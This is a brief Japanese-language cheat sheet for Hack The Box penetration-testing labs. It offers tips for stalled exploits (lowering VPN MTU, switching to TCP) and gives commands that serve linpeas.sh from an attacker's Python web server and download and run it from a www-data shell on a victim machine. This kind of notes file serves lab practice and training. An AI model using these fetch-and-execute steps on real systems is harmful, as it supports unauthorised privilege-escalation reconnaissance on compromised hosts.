チートシート
https://github.com/l4ughingc4t/offsec-cheats/blob/main/htb_cheatsheet.md

# htb

exploitが止まる時

①MTUを下げる（Kali特有の問題）
VPN経由の大きなSMBパケットがフラグメントされて壊れるのが最多原因
sudo ip link set dev tun0 mtu 1200

②VPNをUDP→TCP



# HTTP サーバーを起動
python3 -m http.server 8080

被害マシン（www-data のシェル）から取得：
bashcd /tmp
wget http://10.10.16.166:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
